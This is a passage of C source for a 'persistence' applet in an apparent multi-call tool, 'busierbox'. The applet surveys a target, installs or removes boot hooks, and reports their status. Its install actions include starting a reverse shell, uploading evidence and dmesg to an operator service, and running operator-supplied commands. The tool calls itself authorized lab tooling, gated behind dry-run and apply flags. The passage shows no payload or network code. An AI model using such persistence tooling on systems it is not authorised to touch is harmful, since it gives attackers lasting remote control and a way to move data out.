        bb_ledger_record("modify", hook, !strcmp(root, "/") ? "external" : "recovery-fakeroot", detail);
    }
    printf("%s: installed method=%s name=%s action=%s\n", applet, method, name, action);
    return 0;
}

int applet_recovery_main(int argc, char **argv)
{
    const char *cmd = argc > 1 ? argv[1] : "--help";
    const char *applet = payload_base_name(argc > 0 ? argv[0] : "persistence");
    const char *root = "/";
    const char *name = BB_RECOVERY_BINARY_NAME;
    int json = 0;
    int i;

    if (is_help(argc, argv) || !strcmp(cmd, "--help")) {
        if (!strcmp(applet, "recovery"))
            puts("recovery is a deprecated compatibility alias for persistence.");
        puts("usage: busierbox persistence --survey|--plan [--json] [--root ROOT]");
        puts("       busierbox persistence status [--json] [--root ROOT] [--name NAME]");
        puts("       busierbox persistence install --method METHOD [--action rshell|evidence-push|evidence-then-rshell|dmesg-push|command|script|status-only] --dry-run|--apply [--external] [--root ROOT] [--name NAME] [--file SCRIPT] [-- COMMAND]");
        puts("       busierbox persistence uninstall --method METHOD --dry-run|--apply [--external] [--root ROOT] [--name NAME]");
        puts("Persistence is authorized lab persistence/recovery only. Survey and plan never modify the target.");
        puts("Install and uninstall require an explicit method plus --dry-run or --apply; real-root writes require --external --apply.");
        puts("Evidence actions upload target-initiated evidence to the configured receive-only operator file service.");
        return 0;
    }
    if (!strcmp(cmd, "install"))
        return applet_recovery_install(argc, argv, 0, applet);
    if (!strcmp(cmd, "uninstall"))
        return applet_recovery_install(argc, argv, 1, applet);

    for (i = 2; i < argc; i++) {
        if (!strcmp(argv[i], "--json"))
            json = 1;
        else if (!strcmp(argv[i], "--root") && i + 1 < argc)
            root = argv[++i];
        else if (!strcmp(argv[i], "--name") && i + 1 < argc)
            name = argv[++i];
        else {
            fprintf(stderr, "%s: unknown or incomplete option %s\n", applet, argv[i]);
            return 2;
        }
    }
    if (!strcmp(cmd, "--survey") || !strcmp(cmd, "survey")) {
        recovery_print_survey(json, root);
        return 0;
    }
    if (!strcmp(cmd, "--plan") || !strcmp(cmd, "plan")) {
        recovery_print_survey(json, root);
        if (!json)
            puts("persistence_plan=choose one explicit method, run install --dry-run, then install --apply only when authorized");
        return 0;
    }
    if (!strcmp(cmd, "status")) {
        size_t j;
        int found = 0;
        int installed_count = 0;
        int evidence_action_count = 0;
        int evidence_upload_count = 0;
        int dmesg_action_count = 0;
        int rshell_action_count = 0;
        int rshell_after_evidence_count = 0;
        int command_action_count = 0;
        int script_action_count = 0;
        int operator_supplied_command_count = 0;
        int external_write_required_count = 0;
        int command_queue_enabled_count = 0;
        int hidden_control_channel_count = 0;
        if (json) {
            printf("{\"schema\":1,\"root\":");
            bb_json_string(stdout, root);
            fputs(",\"name\":", stdout);
            bb_json_string(stdout, name);
            fputs(",\"safety\":{\"visible_marked_hooks\":true,\"uninstall_removes_marked_blocks\":true,\"hidden_control_channel\":false,\"command_queue_enabled\":false,\"self_reinstall\":false,\"survives_factory_reset_claim\":false}", stdout);
            fputs(",\"installations\":[", stdout);
        }
        for (j = 0; j < sizeof(recovery_methods) / sizeof(recovery_methods[0]); j++) {
            char action[64], generated[PATH_MAX * 2], path[PATH_MAX], bin[PATH_MAX], script[PATH_MAX];
            if (recovery_status_one(root, &recovery_methods[j], name, action, sizeof(action), generated, sizeof(generated))) {
                recovery_join(path, sizeof(path), root, recovery_methods[j].path);
                recovery_bin_path(bin, sizeof(bin), root, name);
                recovery_script_path(script, sizeof(script), root, name);
                if (json) {
                    printf("%s{\"method\":", found ? "," : "");
                    bb_json_string(stdout, recovery_methods[j].name);
                    fputs(",\"kind\":", stdout); bb_json_string(stdout, recovery_methods[j].kind);
                    fputs(",\"path\":", stdout); bb_json_string(stdout, path);
                    fputs(",\"hook_present\":", stdout); fputs(path_exists(path) ? "true" : "false", stdout);
                    fputs(",\"binary_path\":", stdout); bb_json_string(stdout, bin);
                    fputs(",\"binary_present\":", stdout); fputs(path_exists(bin) ? "true" : "false", stdout);
                    fputs(",\"script_path\":", stdout); bb_json_string(stdout, script);
                    fputs(",\"script_present\":", stdout); fputs(path_exists(script) ? "true" : "false", stdout);
                    fputs(",\"action\":", stdout); bb_json_string(stdout, action[0] ? action : "unknown");
                    fputs(",\"action_category\":", stdout); bb_json_string(stdout, recovery_action_category(action[0] ? action : "unknown"));
                    fputs(",\"uploads_evidence\":", stdout); fputs(recovery_action_uploads_evidence(action) ? "true" : "false", stdout);
                    fputs(",\"collects_dmesg\":", stdout); fputs(recovery_action_collects_dmesg(action) ? "true" : "false", stdout);
                    fputs(",\"starts_rshell\":", stdout); fputs(recovery_action_starts_rshell(action) ? "true" : "false", stdout);
                    fputs(",\"starts_rshell_after_evidence\":", stdout); fputs(recovery_action_starts_rshell_after_evidence(action) ? "true" : "false", stdout);
                    fputs(",\"executes_operator_supplied_command\":", stdout); fputs(recovery_action_executes_operator_supplied_command(action) ? "true" : "false", stdout);
                    fputs(",\"command_queue_enabled\":false", stdout);
                    fputs(",\"hidden_control_channel\":false", stdout);
                    fputs(",\"generated_command\":", stdout); bb_json_string(stdout, generated);
                    fputs(",\"survives_reboot\":", stdout); bb_json_string(stdout, recovery_methods[j].survives_reboot);
                    fputs(",\"intrusiveness\":", stdout); bb_json_string(stdout, recovery_methods[j].intrusiveness);
                    fputs(",\"reversibility\":", stdout); bb_json_string(stdout, recovery_methods[j].reversibility);
                    fputs(",\"requires_external_write\":", stdout); bb_json_string(stdout, recovery_methods[j].requires_external_write);
                    fputc('}', stdout);
                } else {
                    printf("installed_method=%s\n", recovery_methods[j].name);
                    printf("installed_kind=%s\n", recovery_methods[j].kind);
                    printf("installed_path=%s\n", path);
                    printf("installed_hook_present=%s\n", path_exists(path) ? "yes" : "no");
                    printf("installed_binary=%s\n", bin);
                    printf("installed_binary_present=%s\n", path_exists(bin) ? "yes" : "no");
                    printf("installed_script=%s\n", script);
                    printf("installed_script_present=%s\n", path_exists(script) ? "yes" : "no");
                    printf("installed_action=%s\n", action[0] ? action : "unknown");
                    if (generated[0])
                        printf("installed_command=%s\n", generated);
                    printf("installed_survives_reboot=%s\n", recovery_methods[j].survives_reboot);
                    printf("installed_requires_external_write=%s\n", recovery_methods[j].requires_external_write);
                }
                installed_count++;
                if (!strcmp(action, "evidence-push") || !strcmp(action, "evidence-then-rshell") || !strcmp(action, "dmesg-push"))
                    evidence_action_count++;
                if (recovery_action_uploads_evidence(action))
                    evidence_upload_count++;
                if (recovery_action_collects_dmesg(action))
                    dmesg_action_count++;
                if (recovery_action_starts_rshell(action))
                    rshell_action_count++;
                if (recovery_action_starts_rshell_after_evidence(action))
                    rshell_after_evidence_count++;
                if (!strcmp(action, "command"))
                    command_action_count++;
                if (!strcmp(action, "script"))
                    script_action_count++;
                if (recovery_action_executes_operator_supplied_command(action))
                    operator_supplied_command_count++;
                if (!strcmp(recovery_methods[j].requires_external_write, "yes"))
                    external_write_required_count++;
                found = 1;
            }
        }
        if (json) {
            fputc(']', stdout);
            recovery_print_status_indexes(root, name);
            recovery_print_status_api_collections();
            printf(",\"summary\":{\"installation_count\":%d,\"evidence_action_count\":%d,\"evidence_upload_count\":%d,\"dmesg_action_count\":%d,\"rshell_action_count\":%d,\"rshell_after_evidence_count\":%d,\"command_action_count\":%d,\"script_action_count\":%d,\"operator_supplied_command_count\":%d,\"external_write_required_count\":%d,\"command_queue_enabled_count\":%d,\"hidden_control_channel_count\":%d,\"all_require_external_write\":%s,\"any_operator_supplied_command\":%s},\"installed\":%s}\n",
                   installed_count,
                   evidence_action_count,
                   evidence_upload_count,
                   dmesg_action_count,
                   rshell_action_count,
                   rshell_after_evidence_count,
                   command_action_count,
                   script_action_count,
                   operator_supplied_command_count,
                   external_write_required_count,
                   command_queue_enabled_count,
                   hidden_control_channel_count,
                   installed_count > 0 && external_write_required_count == installed_count ? "true" : "false",
                   operator_supplied_command_count > 0 ? "true" : "false",
                   found ? "true" : "false");
        } else if (!found) {
            puts("installed=no");
        }
        return 0;
    }
    fprintf(stderr, "%s: unknown command %s\n", applet, cmd);
    return 2;
}
